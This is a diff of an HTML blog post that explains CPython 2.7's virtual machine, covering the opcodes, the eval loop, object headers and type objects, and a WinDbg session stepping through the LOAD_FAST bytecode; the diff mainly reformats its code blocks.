@@ -160,54 +160,296 @@ All right, let's move on to the first part: this one will focus the essentials a
 <p>As you know, Python is a (really cool) scripting language interpreted, and the source of the official interpreter is available here: <a href="http://www.python.org/ftp/python/2.7.6/Python-2.7.6.tgz">Python-2.7.6.tgz</a>. The project is written in C, and it is really readable ; so please download the sources, read them, you will learn a lot of things.
 Now all the Python code you write is being <em>compiled</em>, at some point, into some "bytecodes": let's say it's exactly the same when your C codes are compiled into x86 code. But the cool thing for us, is that the Python architecture is far more simpler than x86.</p>
 <p>Here is a partial list of all available opcodes in Python 2.7.5:</p>
-<div class="highlight"><pre><span></span>In [5]: len(opcode.opmap.keys())
-Out[5]: 119
-In [4]: opcode.opmap.keys()
-Out[4]: [
- &#39;CALL_FUNCTION&#39;,
- &#39;DUP_TOP&#39;,
- &#39;INPLACE_FLOOR_DIVIDE&#39;,
- &#39;MAP_ADD&#39;,
- &#39;BINARY_XOR&#39;,
- &#39;END_FINALLY&#39;,
- &#39;RETURN_VALUE&#39;,
- &#39;POP_BLOCK&#39;,
- &#39;SETUP_LOOP&#39;,
- &#39;BUILD_SET&#39;,
- &#39;POP_TOP&#39;,
- &#39;EXTENDED_ARG&#39;,
- &#39;SETUP_FINALLY&#39;,
- &#39;INPLACE_TRUE_DIVIDE&#39;,
- &#39;CALL_FUNCTION_KW&#39;,
- &#39;INPLACE_AND&#39;,
- &#39;SETUP_EXCEPT&#39;,
- &#39;STORE_NAME&#39;,
- &#39;IMPORT_NAME&#39;,
- &#39;LOAD_GLOBAL&#39;,
- &#39;LOAD_NAME&#39;,
- ...
-]
+<div class="highlight"><pre><span></span>Python275 available opcodes
+    In [5]: len(opcode.opmap.keys())
+    Out[5]: 119
+    In [4]: opcode.opmap.keys()
+    Out[4]: [
+     &#39;CALL_FUNCTION&#39;,
+     &#39;DUP_TOP&#39;,
+     &#39;INPLACE_FLOOR_DIVIDE&#39;,
+     &#39;MAP_ADD&#39;,
+     &#39;BINARY_XOR&#39;,
+     &#39;END_FINALLY&#39;,
+     &#39;RETURN_VALUE&#39;,
+     &#39;POP_BLOCK&#39;,
+     &#39;SETUP_LOOP&#39;,
+     &#39;BUILD_SET&#39;,
+     &#39;POP_TOP&#39;,
+     &#39;EXTENDED_ARG&#39;,
+     &#39;SETUP_FINALLY&#39;,
+     &#39;INPLACE_TRUE_DIVIDE&#39;,
+     &#39;CALL_FUNCTION_KW&#39;,
+     &#39;INPLACE_AND&#39;,
+     &#39;SETUP_EXCEPT&#39;,
+     &#39;STORE_NAME&#39;,
+     &#39;IMPORT_NAME&#39;,
+     &#39;LOAD_GLOBAL&#39;,
+     &#39;LOAD_NAME&#39;,
+     ...
+    ]
 </pre></div>
 
 
 <h2 id="the-virtual-machine">The virtual machine</h2>
 <p>The Python VM is fully implemented in the function <a href="https://github.com/python-git/python/blob/master/Python/ceval.c#L667">PyEval_EvalFrameEx</a> that you can find in the <a href="https://github.com/python-git/python/blob/master/Python/ceval.c">ceval.c</a> file. The machine is built with a simple loop handling opcodes one-by-one with a bunch of switch-cases:</p>
-<div class="highlight"><pre><span></span><span class="n">PyObject</span> <span class="o">*</span>
-<span class="nf">PyEval_EvalFrameEx</span><span class="p">(</span><span class="n">PyFrameObject</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">throwflag</span><span class="p">)</span>
-<span class="p">{</span>
-  <span class="c1">//...</span>
-  <span class="nl">fast_next_opcode</span><span class="p">:</span>
-  <span class="c1">//...</span>
-  <span class="cm">/* Extract opcode and argument */</span>
-  <span class="n">opcode</span> <span class="o">=</span> <span class="n">NEXTOP</span><span class="p">();</span>
-  <span class="n">oparg</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">HAS_ARG</span><span class="p">(</span><span class="n">opcode</span><span class="p">))</span>
-    <span class="n">oparg</span> <span class="o">=</span> <span class="n">NEXTARG</span><span class="p">();</span>
-  <span class="c1">//...</span>
-  <span class="k">switch</span> <span class="p">(</span><span class="n">opcode</span><span class="p">)</span>
-  <span class="p">{</span>
-    <span class="k">case</span> <span class="nl">NOP</span><span class="p">:</span>
-      <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
+<div class="highlight"><pre><span></span><span class="n">Python</span> <span class="n">VM</span>
+    <span class="n">PyObject</span> <span class="o">*</span>
+    <span class="nf">PyEval_EvalFrameEx</span><span class="p">(</span><span class="n">PyFrameObject</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">throwflag</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="c1">//...</span>
+      <span class="nl">fast_next_opcode</span><span class="p">:</span>
+      <span class="c1">//...</span>
+      <span class="cm">/* Extract opcode and argument */</span>
+      <span class="n">opcode</span> <span class="o">=</span> <span class="n">NEXTOP</span><span class="p">();</span>
+      <span class="n">oparg</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">HAS_ARG</span><span class="p">(</span><span class="n">opcode</span><span class="p">))</span>
+        <span class="n">oparg</span> <span class="o">=</span> <span class="n">NEXTARG</span><span class="p">();</span>
+      <span class="c1">//...</span>
+      <span class="k">switch</span> <span class="p">(</span><span class="n">opcode</span><span class="p">)</span>
+      <span class="p">{</span>
+        <span class="k">case</span> <span class="nl">NOP</span><span class="p">:</span>
+          <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
+
+        <span class="k">case</span> <span class="nl">LOAD_FAST</span><span class="p">:</span>
+          <span class="n">x</span> <span class="o">=</span> <span class="n">GETLOCAL</span><span class="p">(</span><span class="n">oparg</span><span class="p">);</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
+            <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
+            <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
+          <span class="p">}</span>
+          <span class="n">format_exc_check_arg</span><span class="p">(</span><span class="n">PyExc_UnboundLocalError</span><span class="p">,</span>
+            <span class="n">UNBOUNDLOCAL_ERROR_MSG</span><span class="p">,</span>
+            <span class="n">PyTuple_GetItem</span><span class="p">(</span><span class="n">co</span><span class="o">-&gt;</span><span class="n">co_varnames</span><span class="p">,</span> <span class="n">oparg</span><span class="p">));</span>
+          <span class="k">break</span><span class="p">;</span>
+
+        <span class="k">case</span> <span class="nl">LOAD_CONST</span><span class="p">:</span>
+          <span class="n">x</span> <span class="o">=</span> <span class="n">GETITEM</span><span class="p">(</span><span class="n">consts</span><span class="p">,</span> <span class="n">oparg</span><span class="p">);</span>
+          <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
+          <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
+          <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
+
+        <span class="k">case</span> <span class="nl">STORE_FAST</span><span class="p">:</span>
+          <span class="n">v</span> <span class="o">=</span> <span class="n">POP</span><span class="p">();</span>
+          <span class="n">SETLOCAL</span><span class="p">(</span><span class="n">oparg</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span>
+          <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
+
+        <span class="c1">//...</span>
+      <span class="p">}</span>
+</pre></div>
+
+
+<p>The machine also uses a virtual stack to pass/return object to the different opcodes. So it really looks like an architecture we are used to dealing with, nothing exotic.</p>
+<h2 id="everything-is-an-object">Everything is an object</h2>
+<p>The first rule of the VM is that it handles only Python objects. A Python object is basically made of two parts:</p>
+<ul>
+<li>The first one is a header, this header is mandatory for all the objects. Defined like that:</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="n">Python</span> <span class="n">object</span> <span class="n">header</span>
+        <span class="cp">#define PyObject_HEAD                   \</span>
+<span class="cp">          _PyObject_HEAD_EXTRA                \</span>
+<span class="cp">          Py_ssize_t ob_refcnt;               \</span>
+<span class="cp">          struct _typeobject *ob_type;</span>
+
+        <span class="cp">#define PyObject_VAR_HEAD               \</span>
+<span class="cp">          PyObject_HEAD                       \</span>
+<span class="cp">          Py_ssize_t ob_size; </span><span class="cm">/* Number of items in variable part */</span><span class="cp"></span>
+</pre></div>
+
+
+<ul>
+<li>The second one is the variable part that describes the specifics of your object. Here is for example <em>PyStringObject</em>:</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="n">PyStringObject</span>
+        <span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+          <span class="n">PyObject_VAR_HEAD</span>
+          <span class="kt">long</span> <span class="n">ob_shash</span><span class="p">;</span>
+          <span class="kt">int</span> <span class="n">ob_sstate</span><span class="p">;</span>
+          <span class="kt">char</span> <span class="n">ob_sval</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+
+          <span class="cm">/* Invariants:</span>
+<span class="cm">           *     ob_sval contains space for &#39;ob_size+1&#39; elements.</span>
+<span class="cm">           *     ob_sval[ob_size] == 0.</span>
+<span class="cm">           *     ob_shash is the hash of the string or -1 if not computed yet.</span>
+<span class="cm">           *     ob_sstate != 0 iff the string object is in stringobject.c&#39;s</span>
+<span class="cm">           *       &#39;interned&#39; dictionary; in this case the two references</span>
+<span class="cm">           *       from &#39;interned&#39; to this object are *not counted* in ob_refcnt.</span>
+<span class="cm">           */</span>
+        <span class="p">}</span> <span class="n">PyStringObject</span><span class="p">;</span>
+</pre></div>
+
+
+<p>Now, some of you may ask themselves "How does Python know the type of an object when it receives a pointer ?". In fact, this is exactly the role of the field <em>ob_type</em>. Python exports a <em>_typeobject</em> static variable that describes the type of the object. Here is, for instance the <em>PyString_Type</em>:</p>
+<div class="highlight"><pre><span></span><span class="n">PyString_Type</span>
+    <span class="n">PyTypeObject</span> <span class="n">PyString_Type</span> <span class="o">=</span> <span class="p">{</span>
+      <span class="n">PyVarObject_HEAD_INIT</span><span class="p">(</span><span class="o">&amp;</span><span class="n">PyType_Type</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+      <span class="s">&quot;str&quot;</span><span class="p">,</span>
+      <span class="n">PyStringObject_SIZE</span><span class="p">,</span>
+      <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span>
+      <span class="n">string_dealloc</span><span class="p">,</span>                             <span class="cm">/* tp_dealloc */</span>
+      <span class="p">(</span><span class="n">printfunc</span><span class="p">)</span><span class="n">string_print</span><span class="p">,</span>                    <span class="cm">/* tp_print */</span>
+      <span class="mi">0</span><span class="p">,</span>                                          <span class="cm">/* tp_getattr */</span>
+      <span class="c1">// ...</span>
+    <span class="p">};</span>
+</pre></div>
+
+
+<p>Basically, every string objects will have their <em>ob_type</em> fields pointing to that <em>PyString_Type</em> variable. With this cute little trick, Python is able to do type checking like that:</p>
+<div class="highlight"><pre><span></span><span class="n">PyString_Check</span> <span class="n">PyString_CheckExact</span>
+    <span class="cp">#define Py_TYPE(ob)             (((PyObject*)(ob))-&gt;ob_type)</span>
+    <span class="cp">#define PyType_HasFeature(t,f)  (((t)-&gt;tp_flags &amp; (f)) != 0)</span>
+    <span class="cp">#define PyType_FastSubclass(t,f)  PyType_HasFeature(t,f)</span>
+
+    <span class="cp">#define PyString_Check(op) \</span>
+<span class="cp">      PyType_FastSubclass(Py_TYPE(op), Py_TPFLAGS_STRING_SUBCLASS)</span>
+
+    <span class="cp">#define PyString_CheckExact(op) (Py_TYPE(op) == &amp;PyString_Type)</span>
+</pre></div>
+
+
+<p>With the previous tricks, and the <em>PyObject</em> type defined as follow, Python is able to handle in a generic-fashion the different objects:</p>
+<div class="highlight"><pre><span></span><span class="n">PyObject</span>
+    <span class="k">typedef</span> <span class="k">struct</span> <span class="n">_object</span> <span class="p">{</span>
+      <span class="n">PyObject_HEAD</span>
+    <span class="p">}</span> <span class="n">PyObject</span><span class="p">;</span>
+</pre></div>
+
+
+<p>So when you are in your debugger and you want to know what type of object it is, you can use that field to identify easily the type of the object you are dealing with:</p>
+<div class="highlight"><pre><span></span>ob_type really useful when debugging
+    0:000&gt; dps 026233b0 l2
+    026233b0  00000001
+    026233b4  1e226798 python27!PyString_Type
+</pre></div>
+
+
+<p>Once you have done that, you can dump the variable part describing your object to extract the information you want.
+By the way, all the native objects are implemented in the <a href="https://github.com/python-git/python/tree/master/Objects">Objects/</a> directory.</p>
+<h3 id="debugging-session-stepping-the-vm-the-hard-way">Debugging session: stepping the VM. The hard way.</h3>
+<p>It's time for us to go a little bit deeper, at the assembly level, where we belong ; so let's define a dummy function like this one:</p>
+<div class="highlight"><pre><span></span><span class="n">dummy</span> <span class="n">function</span>
+    <span class="k">def</span> <span class="nf">a</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
+      <span class="k">return</span> <span class="n">b</span> <span class="o">+</span> <span class="n">c</span>
+</pre></div>
+
+
+<p>Now using the Python's <a href="http://docs.python.org/2/library/dis.html">dis</a> module, we can disassemble the function object <em>a</em>:</p>
+<div class="highlight"><pre><span></span>disassemble a
+    In [20]: dis.dis(a)
+    2   0 LOAD_FAST                0 (b)
+        3 LOAD_FAST                1 (c)
+        6 BINARY_ADD
+        7 RETURN_VALUE
+    In [21]: a.func_code.co_code
+    In [22]: print &#39;&#39;.join(&#39;\\x%.2x&#39; % ord(i) for i in a.__code__.co_code)
+    \x7c\x00\x00\x7c\x01\x00\x17\x53
+
+    In [23]: opcode.opname[0x7c]
+    Out[23]: &#39;LOAD_FAST&#39;
+    In [24]: opcode.opname[0x17]
+    Out[24]: &#39;BINARY_ADD&#39;
+    In [25]: opcode.opname[0x53]
+    Out[25]: &#39;RETURN_VALUE&#39;
+</pre></div>
+
+
+<p>Keep in mind, as we said earlier, that everything is an object ; so a function is an object, and bytecode is an object as well:</p>
+<div class="highlight"><pre><span></span><span class="n">PyFunctionObject</span> <span class="n">PyCodeObject</span>
+    <span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+      <span class="n">PyObject_HEAD</span>
+      <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_code</span><span class="p">;</span>  <span class="cm">/* A code object */</span>
+      <span class="c1">// ...</span>
+    <span class="p">}</span> <span class="n">PyFunctionObject</span><span class="p">;</span>
+    <span class="cm">/* Bytecode object */</span>
+    <span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+        <span class="n">PyObject_HEAD</span>
+        <span class="c1">//...</span>
+        <span class="n">PyObject</span> <span class="o">*</span><span class="n">co_code</span><span class="p">;</span>    <span class="cm">/* instruction opcodes */</span>
+        <span class="c1">//...</span>
+    <span class="p">}</span> <span class="n">PyCodeObject</span><span class="p">;</span>
+</pre></div>
+
+
+<p>Time to attach my debugger to the interpreter to see what's going on in that weird-machine, and to place a conditional breakpoint on <a href="https://github.com/python-git/python/blob/master/Python/ceval.c#L667">PyEval_EvalFrameEx</a>.
+Once you did that, you can call the dummy function:</p>
+<div class="highlight"><pre><span></span>windbg breakpoint
+    0:000&gt; bp python27!PyEval_EvalFrameEx+0x2b2 &quot;.if(poi(ecx+4) == 0x53170001){}.else{g}&quot;
+    breakpoint 0 redefined
+    0:000&gt; g
+    eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
+    eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+    python27!PyEval_EvalFrameEx+0x2b2:
+    1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c
+
+    0:000&gt; db ecx l8
+    025ea914  7c 00 00 7c 01 00 17 53                          |..|...S
+</pre></div>
+
+
+<p>OK perfect, we are in the middle of the VM, and our function is being evaluated. The register <em>ECX</em> points to the bytecode being evaluated, and the first opcode is <em>LOAD_FAST</em>.</p>
+<p>Basically, this opcode takes an object in the <em>fastlocals</em> array, and push it on the virtual stack. In our case, as we saw in both the disassembly and the bytecode dump, we are going to load the index 0 (the argument <em>b</em>), then the index 1 (argument <em>c</em>).</p>
+<p>Here's what it looks like in the debugger ; first step is to load the <em>LOAD_FAST</em> opcode:</p>
+<div class="highlight"><pre><span></span>fetching the LOAD_FAST opcode
+    0:000&gt;
+    eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
+    eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+    python27!PyEval_EvalFrameEx+0x2b2:
+    1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c
+</pre></div>
+
+
+<p>In <em>ECX</em> we have a pointer onto the opcodes of the function being evaluated, our dummy function. <em>0x7c</em> is the value of the <em>LOAD_FAST</em> opcode as we can see:</p>
+<div class="highlight"><pre><span></span> <span class="n">LOAD_FAST</span>
+    <span class="cp">#define LOAD_FAST 124 </span><span class="cm">/* Local variable number */</span><span class="cp"></span>
+</pre></div>
+
+
+<p>Then, the function needs to check if the opcode has argument or not, and that's done by comparing the opcode with a constant value called <em>HAVE_ARGUMENT</em>:</p>
+<div class="highlight"><pre><span></span>Checking if the opcode has an argument
+    0:000&gt;
+    eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
+    eip=1e0ec568 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+    python27!PyEval_EvalFrameEx+0x2b8:
+    1e0ec568 83f85a          cmp     eax,5Ah
+</pre></div>
+
+
+<p>Again, we can verify the value to be sure we understand what we are doing:</p>
+<div class="highlight"><pre><span></span><span class="n">opcode</span><span class="o">.</span><span class="n">HAVE_ARGUMENT</span>
+    <span class="n">In</span> <span class="p">[</span><span class="mi">11</span><span class="p">]:</span> <span class="s1">&#39;</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">opcode</span><span class="o">.</span><span class="n">HAVE_ARGUMENT</span>
+    <span class="n">Out</span><span class="p">[</span><span class="mi">11</span><span class="p">]:</span> <span class="s1">&#39;5a&#39;</span>
+</pre></div>
+
+
+<p>Definition of <code>HAS_ARG</code> in C:</p>
+<div class="highlight"><pre><span></span><span class="n">HAS_ARG</span>
+    <span class="cp">#define HAS_ARG(op) ((op) &gt;= HAVE_ARGUMENT)</span>
+</pre></div>
+
+
+<p>If the opcode has an argument, the function needs to retrieve it (it's one byte):</p>
+<div class="highlight"><pre><span></span>Fetching the argument
+    0:000&gt;
+    eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
+    eip=1e0ec571 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl nz na pe nc
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200206
+    python27!PyEval_EvalFrameEx+0x2c1:
+    1e0ec571 0fb67901        movzx   edi,byte ptr [ecx+1]       ds:002b:025ea916=00
+</pre></div>
+
+
+<p>As expected for the first <em>LOAD_FAST</em> the argument is <em>0x00</em>, perfect.
+After that the function dispatches the execution flow to the <em>LOAD_FAST</em> case defined as follow:</p>
+<div class="highlight"><pre><span></span><span class="n">LOAD_FAST</span> <span class="n">definition</span>
+    <span class="cp">#define GETLOCAL(i)     (fastlocals[i])</span>
+    <span class="cp">#define Py_INCREF(op) (                         \</span>
+<span class="cp">        _Py_INC_REFTOTAL  _Py_REF_DEBUG_COMMA       \</span>
+<span class="cp">        ((PyObject*)(op))-&gt;ob_refcnt++)</span>
+    <span class="cp">#define PUSH(v)                BASIC_PUSH(v)</span>
+    <span class="cp">#define BASIC_PUSH(v)     (*stack_pointer++ = (v))</span>
 
     <span class="k">case</span> <span class="nl">LOAD_FAST</span><span class="p">:</span>
       <span class="n">x</span> <span class="o">=</span> <span class="n">GETLOCAL</span><span class="p">(</span><span class="n">oparg</span><span class="p">);</span>
@@ -216,404 +458,192 @@ Out[4]: [
         <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
         <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
       <span class="p">}</span>
-      <span class="n">format_exc_check_arg</span><span class="p">(</span><span class="n">PyExc_UnboundLocalError</span><span class="p">,</span>
-        <span class="n">UNBOUNDLOCAL_ERROR_MSG</span><span class="p">,</span>
-        <span class="n">PyTuple_GetItem</span><span class="p">(</span><span class="n">co</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">co_varnames</span><span class="p">,</span> <span class="n">oparg</span><span class="p">));</span>
+      <span class="c1">//...</span>
       <span class="k">break</span><span class="p">;</span>
-
-    <span class="k">case</span> <span class="nl">LOAD_CONST</span><span class="p">:</span>
-      <span class="n">x</span> <span class="o">=</span> <span class="n">GETITEM</span><span class="p">(</span><span class="n">consts</span><span class="p">,</span> <span class="n">oparg</span><span class="p">);</span>
-      <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
-      <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
-      <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
-
-    <span class="k">case</span> <span class="nl">STORE_FAST</span><span class="p">:</span>
-      <span class="n">v</span> <span class="o">=</span> <span class="n">POP</span><span class="p">();</span>
-      <span class="n">SETLOCAL</span><span class="p">(</span><span class="n">oparg</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span>
-      <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
-
-    <span class="c1">//...</span>
-  <span class="p">}</span>
-</pre></div>
-
-
-<p>The machine also uses a virtual stack to pass/return object to the different opcodes. So it really looks like an architecture we are used to dealing with, nothing exotic.</p>
-<h2 id="everything-is-an-object">Everything is an object</h2>
-<p>The first rule of the VM is that it handles only Python objects. A Python object is basically made of two parts:</p>
-<ul>
-<li>
-<p>The first one is a header, this header is mandatory for all the objects. Defined like that:</p>
-<div class="highlight"><pre><span></span><span class="cp">#define PyObject_HEAD                   \</span>
-<span class="cp">  _PyObject_HEAD_EXTRA                \</span>
-<span class="cp">  Py_ssize_t ob_refcnt;               \</span>
-<span class="cp">  struct _typeobject *ob_type;</span>
-
-<span class="cp">#define PyObject_VAR_HEAD               \</span>
-<span class="cp">  PyObject_HEAD                       \</span>
-<span class="cp">  Py_ssize_t ob_size; </span><span class="cm">/* Number of items in variable part */</span><span class="cp"></span>
-</pre></div>
-
-
-</li>
-<li>
-<p>The second one is the variable part that describes the specifics of your object. Here is for example <em>PyStringObject</em>:</p>
-<div class="highlight"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
-  <span class="n">PyObject_VAR_HEAD</span>
-  <span class="kt">long</span> <span class="n">ob_shash</span><span class="p">;</span>
-  <span class="kt">int</span> <span class="n">ob_sstate</span><span class="p">;</span>
-  <span class="kt">char</span> <span class="n">ob_sval</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
-
-  <span class="cm">/* Invariants:</span>
-<span class="cm">   *     ob_sval contains space for &#39;ob_size+1&#39; elements.</span>
-<span class="cm">   *     ob_sval[ob_size] == 0.</span>
-<span class="cm">   *     ob_shash is the hash of the string or -1 if not computed yet.</span>
-<span class="cm">   *     ob_sstate != 0 iff the string object is in stringobject.c&#39;s</span>
-<span class="cm">   *       &#39;interned&#39; dictionary; in this case the two references</span>
-<span class="cm">   *       from &#39;interned&#39; to this object are *not counted* in ob_refcnt.</span>
-<span class="cm">   */</span>
-<span class="p">}</span> <span class="n">PyStringObject</span><span class="p">;</span>
-</pre></div>
-
-
-</li>
-</ul>
-<p>Now, some of you may ask themselves "How does Python know the type of an object when it receives a pointer ?". In fact, this is exactly the role of the field <em>ob_type</em>. Python exports a <em>_typeobject</em> static variable that describes the type of the object. Here is, for instance the <em>PyString_Type</em>:</p>
-<div class="highlight"><pre><span></span><span class="n">PyTypeObject</span> <span class="n">PyString_Type</span> <span class="o">=</span> <span class="p">{</span>
-  <span class="n">PyVarObject_HEAD_INIT</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">PyType_Type</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
-  <span class="s">&quot;str&quot;</span><span class="p">,</span>
-  <span class="n">PyStringObject_SIZE</span><span class="p">,</span>
-  <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span>
-  <span class="n">string_dealloc</span><span class="p">,</span>                             <span class="cm">/* tp_dealloc */</span>
-  <span class="p">(</span><span class="n">printfunc</span><span class="p">)</span><span class="n">string_print</span><span class="p">,</span>                    <span class="cm">/* tp_print */</span>
-  <span class="mi">0</span><span class="p">,</span>                                          <span class="cm">/* tp_getattr */</span>
-  <span class="c1">// ...</span>
-<span class="p">};</span>
-</pre></div>
-
-
-<p>Basically, every string objects will have their <em>ob_type</em> fields pointing to that <em>PyString_Type</em> variable. With this cute little trick, Python is able to do type checking like that:</p>
-<div class="highlight"><pre><span></span><span class="cp">#define Py_TYPE(ob)             (((PyObject*)(ob))-&amp;gt;ob_type)</span>
-<span class="cp">#define PyType_HasFeature(t,f)  (((t)-&amp;gt;tp_flags &amp;amp; (f)) != 0)</span>
-<span class="cp">#define PyType_FastSubclass(t,f)  PyType_HasFeature(t,f)</span>
-
-<span class="cp">#define PyString_Check(op) \</span>
-<span class="cp">  PyType_FastSubclass(Py_TYPE(op), Py_TPFLAGS_STRING_SUBCLASS)</span>
-
-<span class="cp">#define PyString_CheckExact(op) (Py_TYPE(op) == &amp;amp;PyString_Type)</span>
-</pre></div>
-
-
-<p>With the previous tricks, and the <em>PyObject</em> type defined as follow, Python is able to handle in a generic-fashion the different objects:</p>
-<div class="highlight"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_object</span> <span class="p">{</span>
-  <span class="n">PyObject_HEAD</span>
-<span class="p">}</span> <span class="n">PyObject</span><span class="p">;</span>
-</pre></div>
-
-
-<p>So when you are in your debugger and you want to know what type of object it is, you can use that field to identify easily the type of the object you are dealing with:</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt; dps 026233b0 l2
-026233b0  00000001
-026233b4  1e226798 python27!PyString_Type
-</pre></div>
-
-
-<p>Once you have done that, you can dump the variable part describing your object to extract the information you want.
-By the way, all the native objects are implemented in the <a href="https://github.com/python-git/python/tree/master/Objects">Objects/</a> directory.</p>
-<h3 id="debugging-session-stepping-the-vm-the-hard-way">Debugging session: stepping the VM. The hard way.</h3>
-<p>It's time for us to go a little bit deeper, at the assembly level, where we belong ; so let's define a dummy function like this one:</p>
-<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">a</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
-  <span class="k">return</span> <span class="n">b</span> <span class="o">+</span> <span class="n">c</span>
-</pre></div>
-
-
-<p>Now using the Python's <a href="http://docs.python.org/2/library/dis.html">dis</a> module, we can disassemble the function object <em>a</em>:</p>
-<div class="highlight"><pre><span></span>In [20]: dis.dis(a)
-2   0 LOAD_FAST                0 (b)
-    3 LOAD_FAST                1 (c)
-    6 BINARY_ADD
-    7 RETURN_VALUE
-In [21]: a.func_code.co_code
-In [22]: print &#39;&#39;.join(&#39;\\x%.2x&#39; % ord(i) for i in a.__code__.co_code)
-\x7c\x00\x00\x7c\x01\x00\x17\x53
-
-In [23]: opcode.opname[0x7c]
-Out[23]: &#39;LOAD_FAST&#39;
-In [24]: opcode.opname[0x17]
-Out[24]: &#39;BINARY_ADD&#39;
-In [25]: opcode.opname[0x53]
-Out[25]: &#39;RETURN_VALUE&#39;
-</pre></div>
-
-
-<p>Keep in mind, as we said earlier, that everything is an object ; so a function is an object, and bytecode is an object as well:</p>
-<div class="highlight"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
-  <span class="n">PyObject_HEAD</span>
-  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_code</span><span class="p">;</span>  <span class="cm">/* A code object */</span>
-  <span class="c1">// ...</span>
-<span class="p">}</span> <span class="n">PyFunctionObject</span><span class="p">;</span>
-<span class="cm">/* Bytecode object */</span>
-<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
-    <span class="n">PyObject_HEAD</span>
-    <span class="c1">//...</span>
-    <span class="n">PyObject</span> <span class="o">*</span><span class="n">co_code</span><span class="p">;</span>    <span class="cm">/* instruction opcodes */</span>
-    <span class="c1">//...</span>
-<span class="p">}</span> <span class="n">PyCodeObject</span><span class="p">;</span>
-</pre></div>
-
-
-<p>Time to attach my debugger to the interpreter to see what's going on in that weird-machine, and to place a conditional breakpoint on <a href="https://github.com/python-git/python/blob/master/Python/ceval.c#L667">PyEval_EvalFrameEx</a>.
-Once you did that, you can call the dummy function:</p>
-<div class="highlight"><pre><span></span>0:000&amp;gt; bp python27!PyEval_EvalFrameEx+0x2b2 &quot;.if(poi(ecx+4) == 0x53170001){}.else{g}&quot;
-breakpoint 0 redefined
-0:000&amp;gt; g
-eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
-eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
-cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
-python27!PyEval_EvalFrameEx+0x2b2:
